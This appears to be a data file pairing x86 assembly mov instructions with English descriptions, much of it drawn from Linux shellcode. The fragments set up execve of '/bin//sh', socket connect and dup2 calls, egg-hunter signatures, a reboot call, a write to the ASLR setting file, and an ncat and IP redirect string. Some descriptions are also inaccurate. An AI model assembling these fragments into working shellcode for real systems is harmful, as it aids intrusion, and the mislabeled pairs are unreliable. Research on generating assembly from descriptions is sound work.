mov cx, 0x301	move the value 0x301 into the cx register
mov cx, 0x3b30	mov the value 0x3b30 into the cx register
mov cx, 0x401	move 0x401 into cx
mov cx, 0x5309	move 0x5309 into cx
mov cx, 0x9ed	copy the value 4755 into cx register
mov cx, 0x9ed	move 0x9ed into cx
mov cx, 0xfff	move 0xfff into cx
mov cx, 2001	move 2001 into cx
mov cx, 2001q	set flag o_wronly and o_append
mov cx, 2001Q	move 2001Q into cx
mov cx, word_table + 3	move the 4th element of the word_table into cx
mov cx, word_table[3]	move the 4th element of the array word_table into cx
mov cx,[esi]	copy esi content into cx register
mov cx,0x2bc	move the hexadecimal value 0x2bc (700) to cx register
mov cx,0x2bc	load hexadecimal value 0x2bc into cx register
mov cx,0x301	put 769 in cx
mov cx,0x3b30 \n push cx	put 15152 into cx regsiter, then push it on the stack
mov cx,0x401	transfer hexadecimal value 0x401 into cx register
mov dh, 0x35	copy the hexadecimal value 0x35 in dh register
mov dh, 0x35	move 0x35 into dh
mov dh, 0xff	move 0xff into dh
mov dh,0x4a	copy hexadecimal value 0x4a into dh register
mov dl, [esi-1]	move the address of esi-1 into dl
mov dl, [esi-1]	move the previous byte of the shellcode to dl
mov dl, [esi+1]	move the contents of dl into the next byte of the shellcode
mov dl, 0ffh	copy hexadecimal value 0xff in dl register
mov dl, 0x01	move 0x01 into dl
mov dl, 0x02	move 0x02 into dl
mov dl, 0x09	move 0x09 into dl
mov dl, 0x1	move 0x1 into dl
mov dl, 0x10	load 0x10 into dl register
mov dl, 0x10	copy 0x10 into dl register
mov dl, 0x10	load 0x10 into cl register
mov dl, 0x10	move 0x10 into dl
mov dl, 0x14	move 0x14 into dl
mov dl, 0x16	move value 0x16 to dl register
mov dl, 0x1c	transfer the hexadecimal value 0x1c (28) into dl register
mov dl, 0x1c	move 0x1c into dl
mov dl, 0x2	move 0x2 into dl
mov dl, 0x20	move 0x20 into dl
mov dl, 0x45	move 0x45 to dl
mov dl, 0x7f	move 0x7f into dl
mov dl, 0x7f \n push edx	lad ip address 127.0.0.1 (hex) as a byte into edx register then push it onto the stack
mov dl, 0xc	move 0xc into dl
mov dl, 0xd	set dl equal to 13
mov dl, 0xd	move 0xd into dl
mov dl, 0xff	move 0xff into dl
mov dl, 0xff	move 0xff to dl
mov dl, 1+0feh	copy hexadecimal value 1+0xfe in dl register
mov dl, 1+0feh	move 1+0feh into dl
mov dl, 93	move 93 into dl
mov dl, byte [eax + 1]	move the byte at the memory location specified by the operation [eax+1] into dl
mov dl, byte [eax + 1]	move the byte at address eax+1 to dl
mov dl, byte [eax + 1]	move the byte at the address [eax + 1] into dl
mov dl, byte [eax]	move the byte at address eax to dl
mov dl, byte [eax]	move the byte at the address [eax] into dl
mov dl, byte [eax]	move the byte in eax into dl
mov dl, byte [esi + 1]	move the singl byte at the memory location specified by the operation [esi+1] into dl
mov dl, byte [esi + 1]	move the contents of the address esi+1 into dl
mov dl, byte [esi + 1]	move the byte at the address [esi + 1] into dl
mov dl, byte [esi + edi + 1]	move the byte at the address esi+edi+1 into dl
mov dl, byte [esi]	move the single byte in esi into dl
mov dl, byte [esi]	put the byte in esi into dl
mov dl, byte 0ffh	move the byte 0ffh into dl
mov dl, byte 0ffh	move the byte at the address 0ffh into dl
mov dl, len	put lenght of encodedshellcode to dl
mov dl, len	move the contents stored at the address len into the dl register
mov dl,0x09	move the value $0x09 into dl
mov dl,0x1	load the value 1 into dl register
mov dl,0xff	align page address
mov dl,93	save in dl register the len of the buffer to write, 4th arg
mov ds:0x9501bb9b,eax	save at location ds:0x9501bb9b eax content
mov dword [eax], var1	copy the value in var1 into the doubleword starting at the address in eax
mov dword [ebx], 2	move the 32-bit integer representation of 2 into the doubleword starting at the address in ebx
mov dword [ebx], 4	move the 32-bit integer representation of 4 into the doubleword starting at address ebx
mov dword [esi + 12], eax	replace last double word with null
mov dword [esi + 12], eax	move eax into the dword at address [esi + 12]
mov dword [esi + 8], ebx	replace first double word with string
mov dword [esi + 8], ebx	move ebx into the dword at address [esi + 8]
mov dword [esp-0x10], 0x5f657a69	move the value 0x5f657a69 into the double word starting at the address [esp-0x10]
mov dword [esp-0x14], 0x6d6f646e	move the value 0x6d6f646e into the double word starting at the address [esp-0x14]
mov dword [esp-0x18], 0x61722f6c	move the value 0x61722f6c into the double word starting at the address [esp-0x18]
mov dword [esp-0x1c], 0x656e7265	move the value 0x656e7265 into the double word starting at the address [esp-0x1c]
mov dword [esp-0x20], 0x6b2f7379	move the value 0x6b2f7379 into the double word starting at the address [esp-0x20]
mov dword [esp-0x24], 0x732f636f	move the value 0x732f636f into the double word starting at the address [esp-0x24]
mov dword [esp-0x28], 0x72702f2f	move the value 0x72702f2f into the double word starting at the address [esp-0x28]
mov dword [esp-0x4], eax	move the contents of the eax into the double word starting at the address [esp-0x4]
mov dword [esp-0x4],eax \n mov dword [esp-0x8],0x65636170 \n mov dword [esp-0xc],0x735f6176 \n mov dword [esp-0x10],0x5f657a69 \n mov dword [esp-0x14],0x6d6f646e \n mov dword [esp-0x18],0x61722f6c \n mov dword [esp-0x1c],0x656e7265 \n mov dword [esp-0x20],0x6b2f7379 \n mov dword [esp-0x24],0x732f636f \n mov dword [esp-0x28],0x72702f2f \n sub esp,0x28 \n mov ebx,esp	push the string //proc/sys/kernel/randomize_va_space and the eax context on the stack and then load the stack pointer into ebx register
mov dword [esp-0x8], 0x65636170	move the value 0x65636170 into the double word starting at the address [esp-0x8]
mov dword [esp-0xc], 0x735f6176	move the value 0x735f6176 into the double word starting at the address [esp-0xc]
mov dword [esp-12], 0x6374652f	move 0x6374652f into the dword at address [esp-12]
mov dword [esp-12], 0x6374652f	move 0x6374652f into the dword at the memory location [esp-12]
mov dword [esp-4], ecx	copy ecx content as a double word into memory space at the address esp-4
mov dword [esp-4], ecx	move ecx into the doubleword starting at the address esp-4
mov dword [esp-4], esi	copy esi content as a double word into memory sapce at the address esp-4
mov dword [esp-4], esi	move esi into the dword at address [esp-4]
mov dword [esp-4], esi	move the contents of the esi register into the dword at the memory location [esp-4]
mov dword [esp-4], esi	move esi into the doubleword starting at the address esp-4
mov dword [esp-8], 0x68732f2f	move 0x68732f2f into the dword at address [esp-8]
mov dword [esp-8], 0x68732f2f	move 0x68732f2f into the dword at the memory location [esp-8]
mov dword [esp-8], edi	copy edi content as a double word into memory space at the address esp-8
mov dword [esp-8], edi	move edi into the doubleword starting at the address esp-8
mov dword ptr [edx-0x55af551d],ebp \n mov dword ptr [edx-0x55ac551e],ebp \n mov dword ptr [edx-0x554f551f],ebp	copy ebp content into double word at the addresses edx-0x55af551d, edx-0x55ac551e, edx-0x554f551f
mov dword ptr [esi+0x10],ebx	copy the double word in ebx register into the memory space at the address esi+0x10
mov dword ptr [esi+0xc],esi	copy the double word in esi register into the space memory at the address esi+0xc
mov dword ptr [esp-0x4],edi	copy edi content into the memory space at the address esp-0x4
mov dword ptr [esp-0x8],edi	copy edi content into the memory space at the address esp-0x8
mov dx, 0x1a4	set read-write permission for the owner of the file, and read permission for everyone else
mov dx, 0x1a4	move 0x1a4 into dx
mov dx, 0x2a1	move the value 0x2a1 into the dx register
mov dx, 0xb01	move 0xb01 into dx
mov dx, 0xfff \n inc dx	load hecadecimal value 0xfff into dx register then increment dx content by 1
mov dx, 1222	move 1222 into dx
mov dx, 132	move the deciaml value 132 in dx register
mov dx, 132	move 132 into dx
mov dx, 16666	move 16666 into dx
mov dx,0x2a1	put 673 in dx
mov dx,0x3a30	load ‘:0’ into dx register
mov dx,0xb01	move the hexadecimal value 0xb01 to dx register
mov eax, _start	set a valid .text address, ‘_start’ into eax
mov eax, _start	move _start into eax
mov eax, [ebp+8]	move value of memory address [ebp+8] into eax
mov eax, [ebx]	move the 4 bytes in memory at the address contained in ebx into eax
mov eax, [ebx+8]	copy the 4 byte at memory location specified by the the result of the operation ebx+8 into eax register
mov eax, [ebx+epi*4+2]	move the contents of memory address ebx+epi*4+2 into eax
mov eax, [ebx+esi]	move the contents of memory address ebx+esi into eax
mov eax, [ebx+esi*2+4]	move the contents of memory address ebx+esi*2+4 into eax
mov eax, [esi-4]	move 4 bytes at memory address esi-4 into eax
mov eax, [esp]	move the contents of memory address esp into eax
mov eax, [esp+4]	move the value of register at address esp+4 and store into eax
mov eax, [temp]	move the contents at memory specified by temp into eax
mov eax, [temp1]	move the contents at memory address temp1 to eax
mov eax, [x]	move the contents at memory specified by x to eax
mov eax, [y]	move the contents at memory address y to eax
mov eax, [y]	move the contents at memory specified by y to eax
mov eax, [z]	move the contents at memory specified by z to eax
mov eax, 0ah	move 0ah into eax
mov eax, 0ah	move an ascii linefeed character into eax
mov eax, 0ah	move linefeed character into eax
mov eax, 0x2e323931	move 0x2e323931 into eax
mov eax, 0x2e383631	move 0x2e383631 into eax
mov eax, 0x2f3e20	move 0x2f3e20 into eax
mov eax, 0x2f766564	move 0x2f766564 into eax
mov eax, 0x31263e32	move 0x31263e32 into eax
mov eax, 0x31263e32 \n mov eax, 0x6c6c756e \n mov eax, 0x2f766564 \n mov eax, 0x2f3e20 \n mov eax, 0x782f2f \n mov eax, 0x33392e31 \n mov eax, 0x2e383631 \n mov eax, 0x2e323931 \n push eax \n mov ecx,esp	load the string 192.168.1.93//x </dev/null2<&1 in ecx register
mov eax, 0x33392e31	move 0x33392e31 into eax
mov eax, 0x3f	move 0x3f into eax
mov eax, 0x5	move 5 into eax
mov eax, 0x50905090	store egg (0x50905090) in eax
mov eax, 0x50905090	move 0x50905090 into eax
mov eax, 0x563ed8b7	move 0x563ed8b7 into eax
mov eax, 0x563ed8b7 \n add eax, 0x12345678 \n push eax	push ‘//sh’ on stack
mov eax, 0x66	move 0x66 into eax
mov eax, 0x6c6c756e	move 0x6c6c756e into eax
mov eax, 0x782f2f	move 0x782f2f into eax
mov eax, 0x8000	move the 32-bit value 0x8000 into register eax
mov eax, 0x8b90909d	move 0x8b90909d into eax
mov eax, 0x8b90909d \n not eax \n push eax \n mov eax, 0x9a8dd091 \n not eax \n push eax \n mov eax, 0x969d8cd0 \n not eax \n push eax \n xor eax, eax	put the string /sbin/reboot on the stack through eax register then clear it
mov eax, 0x969d8cd0	move 0x969d8cd0 into eax
mov eax, 0x9a8dd091	move 0x9a8dd091 into eax
mov eax, 0xb33fb33f	move 0xb33fb33f into eax
mov eax, 0xdeadc0de	move 0xdeadc0de into eax
mov eax, 0xdeadc0de \n sub eax, 0x70445eaf \n push eax	push ‘/bin’ on stack
mov eax, 0xfeffff80	copy hexadecimal value 0xfeffff80 into eax register
mov eax, 0xfeffff80	move 0xfeffff80 into eax
mov eax, 0xffffffff	move 0xffffffff into eax
mov eax, 0xffffffff \n not eax \n push eax	move the value -1 in eax register then do the one's complement negation of eax end then push it on the stack
mov eax, 1	code for exit syscall
mov eax, 1	exit
mov eax, 1	invoke sys_exit
mov eax, 1	make the system call exit
mov eax, 1	make the system call for exit
mov eax, 1	make the system call to terminate the process
mov eax, 1	move 1 into eax
mov eax, 1	move the value one into eax
mov eax, 1	specify exit syscall
mov eax, 1	system call exit
mov eax, 1	terminate the process
mov eax, 1 \n int 80h	execute __nr_exit sycall
mov eax, 10	invoke sys_unlink
mov eax, 10	move 10 into eax
mov eax, 10000h	move 10000h into eax register
mov eax, 102	invoke sys_socketcall
mov eax, 106	get information about the file
mov eax, 106	make the system call stat
mov eax, 106	make the system call to get information about the file
mov eax, 106	stat
mov eax, 106	system call stat
mov eax, 11	execve
mov eax, 11	invoke sys_execve
mov eax, 11	load and run the program
mov eax, 11	make the system call execve
mov eax, 11	make the system to load and run the program
mov eax, 11	system call execve
mov eax, 13	invoke sys_time
mov eax, 132	move 132 to eax 132
mov eax, 19	go to file offset
mov eax, 19	invoke sys_lseek
mov eax, 19	lseek
mov eax, 19	make the system call lseek
mov eax, 19	make the system call to go to the file offset
mov eax, 19	system call lseek
mov eax, 2	create a new process
mov eax, 2	fork
mov eax, 2	invoke sys_fork
mov eax, 2	make the system call fork
mov eax, 2	make the system call to create a new process
mov eax, 2	move the value two into eax
mov eax, 2	system call fork
mov eax, 20	get the process ID
mov eax, 20	getpid
mov eax, 20	make the system call getpid
mov eax, 20	make the system call to get the process ID
mov eax, 20	system call getpid
mov eax, 21	get 21 in the eax register
mov eax, 27	alarm
mov eax, 27	make the system call alarm
mov eax, 27	make the system call to set set signal delivery alarm clock
mov eax, 27	set signal delivery alarm clock
mov eax, 27	system call alarm
mov eax, 29	make the system call pause
mov eax, 29	make the system call to suspend the process
mov eax, 29	pause
mov eax, 29	suspend the process until the signal arrives
mov eax, 29	system call pause
mov eax, 3	invoke sys_read
mov eax, 3	make the system call read
mov eax, 3	make the system call to read the file
mov eax, 3	move 3 to the eax register
mov eax, 3	read
mov eax, 3	read the file
mov eax, 3	specify sys_read call
mov eax, 3	system call read
mov eax, 37	kill
mov eax, 37	make the system call kill
mov eax, 37	make the system call to send the signal to another process
mov eax, 37	send signal to another process
mov eax, 37	system call kill
mov eax, 4	invoke sys_write
mov eax, 4	make the system call for write
mov eax, 4	make the system call to write to the file
mov eax, 4	make the system call write
mov eax, 4	move 4 into eax
mov eax, 4	move 4 to the eax register
mov eax, 4	specify sys_write call
mov eax, 4	specify sys_write syscall
mov eax, 4	system call write
mov eax, 4	write
mov eax, 4	write to the file
mov eax, 48	install signal handel
mov eax, 48	make the system call signal
mov eax, 48	make the system call to install the signal handler
mov eax, 48	signal
mov eax, 48	system call signal
mov eax, 5	invoke sys_open
mov eax, 5	make the system call open
mov eax, 5	make the system call to open the file
mov eax, 5	open
mov eax, 5	open the file
mov eax, 5	system call open
mov eax, 6	close
mov eax, 6	close the file
mov eax, 6	invoke sys_close
mov eax, 6	make the system call close
mov eax, 6	make the system call to close the file
mov eax, 6	system call close
mov eax, 63	copy file descriptor
mov eax, 63	dup2
mov eax, 63	make the system call dup2
mov eax, 63	make the system call to copy the file descriptor
mov eax, 63	system call dup2
mov eax, 64	get the parent process ID
mov eax, 64	getppid
mov eax, 64	make the system call getppid
mov eax, 64	make the system call to get the parent process ID
mov eax, 64	system call getppid
mov eax, 65	get process group
mov eax, 65	getpgrp
mov eax, 65	make the system call getpgrp
mov eax, 65	make the system call to get the process group
mov eax, 65	system call getpgrp
mov eax, 67	install portable signal handler
mov eax, 67	make the system call sigaction
mov eax, 67	make the system call to install portable signal handler
mov eax, 67	sigaction
mov eax, 67	system call sigaction
mov eax, 7	make the system call to wait for child for terminate
mov eax, 7	make the system call waitpid
mov eax, 7	system call waitpid
mov eax, 7	wait for child to terminate
mov eax, 7	waitpid
mov eax, 8	invoke sys_creat
mov eax, 90	make the system call mmap
mov eax, 90	make the system call to map the memory page to a file
mov eax, 90	map the memory page to a file
mov eax, 90	mmap
mov eax, 90	move decimal number 90 into eax
mov eax, 90	system call mmap
mov eax, addr	retrieve a valid address saving it into eax
mov eax, addr	move addr into eax
mov eax, array[esi*4]	move the contents of memory address array+esi*4 into eax
mov eax, b	move b to eax
mov eax, buff	move buff to eax
mov eax, buffer	move the memory address of buffer variable into eax
mov eax, buzz	move the address of buzz string into eax
mov eax, c	move c to eax
mov eax, childmsg	move childmsg into eax
mov eax, ebx	backup ebx into eax
mov eax, ebx	copy the contents of ebx into eax register
mov eax, ebx	copy what is in ebx into eax
mov eax, ebx	move ebx to eax
mov eax, ebx	move the address in ebx into eax
mov eax, ebx	transfer ebx to eax
mov eax, ecx	move the value in ecx into eax
mov eax, ecx	move the value of ecx into eax
mov eax, edi	move edi into eax
mov eax, edi	move edi to eax
mov eax, edx	copy edx content into eax register
mov eax, edx	move edx into eax
mov eax, edx	move the remainder into eax
mov eax, esi	move esi into eax
mov eax, esi \n inc eax	load 4 into eax
mov eax, esp	move stack pointer to eax
mov eax, esp	move the address of the current stack pointer into eax
mov eax, filecontents	move the memory address of filecontents variable into eax
mov eax, fizz	move the address of fizz string into eax
mov eax, key	move key into eax
mov eax, key \n mov edi, edx	copy key into eax and edx in edi
mov eax, m_src	move m_src to eax
mov eax, msg	move the address of msg string into eax
mov eax, msg1	move msg1 string into eax
mov eax, msg1	move the address of msg1 into eax
mov eax, msg2	move the address of msg2 into eax
mov eax, msg3	move the address of msg3 into eax
mov eax, mxcsr	move mxcsr to eax
mov eax, n_src	move n_src to eax
mov eax, parentmsg	move parentmsg into eax
mov eax, response	move address of response variable into eax
mov eax, type var4	move the number of bytes of var4 into eax
mov eax,0x50905090	moving egg=0x50905090
mov ebp, buff	place address of buffer into ebp
mov ebp, eax	move eax to ebp
mov ebp, ecx	move ecx into ebp
mov ebp, esp	save esp content into ebp
mov ebp, esp	move esp into ebp
mov ebp, esp	point ebp to the esp register
mov ebp, esp	point ebp to top of stack
mov ebp, esp	set the new base pointer
mov ebx, [ebp-4]	move the contents at the memory location specified by the result of the operation [ebp-4] into the ebx register
mov ebx, [ebp-4]	move the contents of the address [ebp-4] into the ebx register
mov ebx, [ebp-8]	move the contents at the memory location specified by the result of the operation [ebp-8] into the ebx register
mov ebx, [ebp-8]	move the contents of the address [ebp-8] into the ebx register
mov ebx, [ebx+esi]	move the contents of memory address ebx+esi into ebx
mov ebx, [esp]	move value at top of the stack to ebx
mov ebx, [my_table]	move effective address of my_table in ebx
mov ebx, [my_table]	save the effective address of my_table in ebx
mov ebx, [temp2]	move the contents at memory address temp2 to ebx
mov ebx, [x]	move the contents at memory address x to ebx
mov ebx, [y]	move the contents at memory address y to ebx
mov ebx, 0	exit with return code of 0
mov ebx, 0	return 0 status on exit
mov ebx, 0	return a code of zero
mov ebx, 0	specify file descriptor 0 as standard input
mov ebx, 0	use stdin
mov ebx, 0	write to the stdin file
mov ebx, 0x1	move 0x1 into ebx
mov ebx, 0x2	move 0x2 into ebx
mov ebx, 0x4	move 0x4 into ebx
mov ebx, 0x40000	move the 32-bit value 0x40000 into register ebx
mov ebx, 0x5	move 0x5 into ebx
mov ebx, 0xfee1dead	loading 0xfee1dead in ebx
mov ebx, 0xfee1dead	move the value 0xfee1dead into the ebx register
mov ebx, 1	file descriptor 1 standard output
mov ebx, 1	invoke subroutine socket
mov ebx, 1	move 1 into ebx
mov ebx, 1	specify file descriptor 1 standard output
mov ebx, 1	use stdout
mov ebx, 1	write to the stdout file
mov ebx, 10	move decimal value 10 into ebx
mov ebx, 2	invoke subroutine bind
mov ebx, 2	specify file descriptor 2 standard error
mov ebx, 3	invoke subroutine connect
mov ebx, 3	move 3 to the ebx register
mov ebx, 3	move decimal number 3 into ebx
mov ebx, 4	invoke subroutine listen
mov ebx, 5	invoke subroutine accept
mov ebx, 5	move 5 into ebx
mov ebx, 9	move number 9 into ebx
mov ebx, buff	move buff to ebx
mov ebx, command	move command into ebx
mov ebx, dword 0x5090508f	save egg signature altered: 0x50905090 – 1 into ebx
mov ebx, dword 0x5090508f	move dword 0x5090508f into ebx
mov ebx, dword 0x50905091	move dword 0x50905091 into ebx
mov ebx, dword 0x50905091 \n dec ebx	load hexadecimal value 0x50905091 as a double word into ebx register then decrement its content by 1
mov ebx, eax	move eax contents to ebx register
mov ebx, eax	transfer eax content into ebx
mov ebx, eax	copy eax into ebx register
mov ebx, eax	copy eax content into ebx register
mov ebx, eax	move eax content into ebx register
mov ebx, eax	store sock_file_des in ebx register
mov ebx, eax	move client fd to ebx
mov ebx, eax	zero out ebx
mov ebx, eax	move the address in eax into ebx
mov ebx, eax	move the contents of the eax register into the ebx register
mov ebx, eax	move eax into ebx
mov ebx, ecx	copy ecx content into ebxx register
mov ebx, ecx	copy ecx content into ebx
mov ebx, ecx	move ecx into ebx
mov ebx, ecx	backup ecx into ebx
mov ebx, edi	copy edi content into ebx register
mov ebx, edi	move edi into ebx
mov ebx, edx	set ebx =1
mov ebx, edx	move the client socket fd from edx into ebx
mov ebx, edx	save edx content into ebx
mov ebx, edx	move edx into ebx
mov ebx, esi	save the saved socket descpritor in ebx
mov ebx, esi	save the esi contenmts in ebx register
mov ebx, esi	store address of /usr/bin/ncat into ebx register
mov ebx, esi	copy esi content into ebx register
mov ebx, esi	load arg1 = ‘/bin/sh’ into ebx register
mov ebx, esi	save esi content into ebx
mov ebx, esi	move esi into ebx
mov ebx, esp	push /bin/sh into ebx
mov ebx, esp	load the stack pointer into ebx register
mov ebx, esp	load the strinf //bin/sh in ebx register
mov ebx, esp	save addr of stack into ebx
mov ebx, esp	ebx = /bin//sh
mov ebx, esp	load the pointer to args into ebx register
mov ebx, esp	ebx points the top pf the stack
mov ebx, esp	load stack pointer into ebx register
mov ebx, esp	loast stcak pointer into ebx register
mov ebx, esp	point ebx to stack
mov ebx, esp	push esp pointer to ebx
mov ebx, esp	ebx points to the memory struct
mov ebx, esp	store esp pointer in ebx
mov ebx, esp	trasnfer esp content to ebx
mov ebx, esp	"put the address of ""/bin//sh"" into ebx via esp"
mov ebx, esp	load esp content into ebx
mov ebx, esp	ebx points to the top of the stack
mov ebx, esp	trasfer stack pointer into ebx register
mov ebx, esp	ebx points the top of the stack
mov ebx, esp	ebx point to pushed string
mov ebx, esp	move stack ptr to ebx
mov ebx, esp	"moving the pointer to ""/bin//sh"" to ebx"
mov ebx, esp	moving the pointer to the string ‘/bin//cn’ to ebx
mov ebx, esp	moves the memory address of esp(pointing to our string & nulls) from the stack into ebx
mov ebx, esp	save esp content into ebx
mov ebx, esp	save esp content into ebx register
mov ebx, esp	"save the arg ""/bin//sh/"" into ebx"
mov ebx, esp	ebx point to the structure
mov ebx, esp	save esp content into ebx regsiter
mov ebx, esp	load address of /bin/sh into ebx
mov ebx, esp	move the address of the character on the stack into ebx
mov ebx, esp	move the contents of the esp register into the ebx register
mov ebx, esp	move esp into ebx
mov ebx, esp	move address of stack pointer into ebx
mov ebx, filename	move filename into ebx
mov ebx, m_src1	move m_src1 to ebx
mov ebx, m_src2	move m_src2 to ebx
mov ebx, msg	move the address of msg string into ebx
mov ebx, n	move n to ebx
mov ebx, name	move name into ebx
mov ebx, request	move address of request variable into ebx
mov ebx, sock_reg	move sock_reg into ebx
mov ebx, type var3	move the number of bytes of var3 into ebx
mov ebx, upcase	move the value of upcase into ebx
mov ebx, x	move the contents of x into ebx
mov ebx, zero_reg	move zero_reg into ebx
mov ebx,eax	copy eax content into ebx register
mov ebx,eax	load eax content into ebx
mov ebx,eax	load eax content into ebx register
mov ebx,eax	save the returned value of the previous sys call (fd) into ebx, 2nd arg
mov ebx,eax \n push eax	move eax register to ebx register then push eax on the register
mov ebx,eax \n push ebx	trasfer aex contents into ebx contents and push ebx on the stack
mov ebx,esi	copy socket file descriptor from esi to ebx to feed clientid
mov ebx,esi	copy the esi content into ebx register
mov ebx,esi	load esi content into ebx register
mov ebx,esi	save esi content into ebx
mov ebx,esp	load esp content into ebx register
mov ebx,esp	save addr of stack into ebx
mov ebx,esp	copy esp content into ebx register
mov ebx,esp	ebx points to memory struct
mov ebx,esp	point ebx to stack
mov ebx,esp	load stack pointer into ebx register
mov ebx,esp	set first arg in ebx=*filename
mov ebx,esp	set the 1st arg /bin/bash from the stack
mov ebx,esp	save pointer into ebx
mov ecx ,esp	move esp content into ecx register
mov ecx, [ebp+12]	move the contents at the memory location specified by the result of the operation [ebp+12] into the ecx register
mov ecx, [ebp+12]	move the contents of the address [ebp+12] into ecx
mov ecx, [esi+4*eax]	move the 4 bytes of data at address esi+4*eax into ecx
mov ecx, [esp]	move the contents of esp into ecx
mov ecx, [esp]	move the contents of the esp register into the ecx register
mov ecx, [my_table]	move effective address of my_table in ecx
mov ecx, [temp3]	move the contents at memory address temp3 to ecx
mov ecx, [x]	move the contents at memory address x to ecx
mov ecx, 0777	move permissions to read write and execute into ecx
mov ecx, 0x0	move 0x0 into ecx
mov ecx, 0x04030382	mov ip address in ecx
mov ecx, 0x1	move 0x1 into ecx
mov ecx, 0x88998899	move 0x88998899 into ecx
mov ecx, 0x88998899 \n sub ecx, 0x1525152a \n push ecx	push ‘osts’ on stack
mov ecx, 1	move 1 into ecx
mov ecx, 36	get 36 in the ecx
mov ecx, 4294948047	move 4294948047 into ecx
mov ecx, 672274793	loading 0x1234567 in ecx
mov ecx, 672274793	move the value 672274793 into the ecx register
mov ecx, arguments	move the address of the arguments into ecx
mov ecx, array	move the first element of array into ecx
mov ecx, array2	move the first element in array2 into ecx
mov ecx, b	move b to ecx
mov ecx, buff	move buff to ecx
mov ecx, buffer	move the memory address of buffer variable into ecx
mov ecx, contents	move the memory address of contents string into ecx
mov ecx, contents	move the memory address of contents variable into ecx
mov ecx, donemsg	move donemsg into ecx
mov ecx, eatmsg	move eatmsg into ecx
mov ecx, eax	move eax into ecx
mov ecx, ebp	copy epb content into ecx register
mov ecx, ebp	move ebp into ecx
mov ecx, ebp	copy the value of ebp to ecx
mov ecx, ebx \n mov ebx, eax	copy ebx content into ecx and eax content into ebx
mov ecx, edi	move edi into ecx
mov ecx, edi \n xor edx, edx	load edi content into ecx register then clear edx
mov ecx, edx	put 0 in ecx
mov ecx, edx	set counter ecx = 2
mov ecx, edx	save edx content into ecx
mov ecx, edx	initialize counter, ecx, to 2
mov ecx, edx	move edx into ecx
mov ecx, edx	move the contents of the edx register into the ecx register
mov ecx, edx	backup edx into ecx
mov ecx, esi	move esi into ecx
mov ecx, esp	transfer esp contents into ecx
mov ecx, esp	trasnfer esp contents into ecx register
mov ecx, esp	trasfer esp contents to ecx register
mov ecx, esp	ecx points to the top of the stack
mov ecx, esp	load the stack pointer in ecx register
mov ecx, esp	load the stack pointer in ecx regsiter
mov ecx, esp	load esp content in ecx
mov ecx, esp	load the stack pointer into ecx register
mov ecx, esp	load esp content into ecx register
mov ecx, esp	save addr of stack into ecx
mov ecx, esp	load stack pointer into ecx register
mov ecx, esp	load esp content into ecx
mov ecx, esp	pointer to args on the stack into ecx
mov ecx, esp	load on ecx the pointer to the arguments n the stack into ecx
mov ecx, esp	load the pointer to v4lhist struct arguments in ecx register
mov ecx, esp	copy in ecx the argument pointer
mov ecx, esp	load the pointer to struct into ecx register
mov ecx, esp	load the arguments previously pushed on stack into register ecx
mov ecx, esp	load the pointer to args into ecx register
mov ecx, esp	move the pointer to args into ecx register
mov ecx, esp	move stack pointer to ecx
mov ecx, esp	copy esp content into ecx register
mov ecx, esp	copy esp content in ecx register
mov ecx, esp	save address od the top of the stack into ecx
mov ecx, esp	save the argument array into ecx register
mov ecx, esp	store argv array into ecx via the stack or esp
mov ecx, esp	save pointer to ecx
mov ecx, esp	trasnfer esp content to ecx register
mov ecx, esp	move address of the opernads into ecx
mov ecx, esp	set the args
mov ecx, esp	move stack ptr into ecx
mov ecx, esp	move stack ptr to ecx
mov ecx, esp	mv final stack ptr to ecx
mov ecx, esp	mv new stack ptr to ecx
mov ecx, esp	move satck pointer to ecx
mov ecx, esp	save esp content into ecx
mov ecx, esp	ecx point the top of the stack
mov ecx, esp	save the pointer to args in ecx register
mov ecx, esp	pointer to struct
mov ecx, esp	save the pointer to args in ecx
mov ecx, esp	move the memory location of args to ecx
mov ecx, esp	pushes the memory location of args into ecx
mov ecx, esp	move memory location of the args to ecx
mov ecx, esp	save the new socket fd into ecx
mov ecx, esp	move the memory location of the args list into ecx
mov ecx, esp	move the memeory location of the args to ecx
mov ecx, esp	moves the address of the string from the stack to ecx
mov ecx, esp	save esp content into ecx register
mov ecx, esp	load address of the parameter array into ecx
mov ecx, esp	ecx point to the structur
mov ecx, esp	load address of the parameter array
mov ecx, esp	load address of the parameter array intp ecx
mov ecx, esp	load array address into ecx
mov ecx, esp	ecx point to the structure
mov ecx, esp	move esp into ecx
mov ecx, esp	move the contents of the esp register into the ecx register
mov ecx, esp	ecx point to the top of the stack
mov ecx, esp	move the address of the stack pointer into ecx
mov ecx, esp	move the contents of esp into ecx
mov ecx, esp	move address of arguments into ecx
mov ecx, esp	save the memory location of arg[0] into the ecx register
mov ecx, esp	move address of stack pointer into ecx
mov ecx, esp	point ecx to the top of the stack
mov ecx, esp \n mov edx, esp	copy esp content into ecx and edx registers
mov ecx, filecontents	move the memory address of our file contents variable into ecx
mov ecx, hello	put the offset of hello in ecx
mov ecx, hexstr	move hexstr into ecx
mov ecx, m_src3	move m_src3 to ecx
mov ecx, msg	move msg to ecx
mov ecx, msg	move the address of message string into ecx
mov ecx, msg	move the memory address of message string into ecx
mov ecx, offset array	move starting address of array to ecx
mov ecx, readbuffer	move readbuffer into ecx
mov ecx, request	move address of request variable into ecx
mov ecx, response	move address of response variable into ecx
mov ecx, rm	move rm to ecx
mov ecx, rn	move rn to ecx
mov ecx, type var2	move the number of bytes of var2 into ecx
mov ecx, y	move the contents of y into ecx
mov ecx,eax \n push ecx	transfer eax content into ecx register then push ecx register on the stcak
mov ecx,edi	load edi content into ecx register
mov ecx,esp	transfer esp contents into ecx contents
mov ecx,esp	move espaddress to ecx
mov ecx,esp	get stack pointer to ecx
mov ecx,esp	move esp contents to ecx
mov ecx,esp	load the stack pointer into ecx register
mov ecx,esp	load the satck ppointer into ecx register
mov ecx,esp	load esp content into ecx register
mov ecx,esp	move stack pointer into ecx
mov ecx,esp	save addr of stack into ecx
mov ecx,esp	save the pointer to socket args into ecx register
mov ecx,esp	load the pointer to struct into ecx register
mov ecx,esp	tranfer the pointer to args from esp into ecx register
mov ecx,esp	save pointer (esp) to socket() args (ecx)
mov ecx,esp	load pointer to struct sockaddr into ecx register
mov ecx,esp	load into ecx the pointer to args stored in esp
mov ecx,esp	load the pointer to args into ecx regsiter
mov ecx,esp	make ecx pointing to args
mov ecx,esp	save stack pointer into ecx register
mov ecx,esp	load the pointer to the struct into ecx regsiter
mov ecx,esp	load stack pointer into ecx regisetr
mov ecx,esp	load stack pointer into ecx register
mov ecx,esp	move stack pointer to ecx
mov ecx,esp	save in ecx the pointer to socket arguements
mov ecx,esp	point ecx to stack
mov ecx,esp	copy esp content into ecx register
mov ecx,esp	save esp content into ecx register
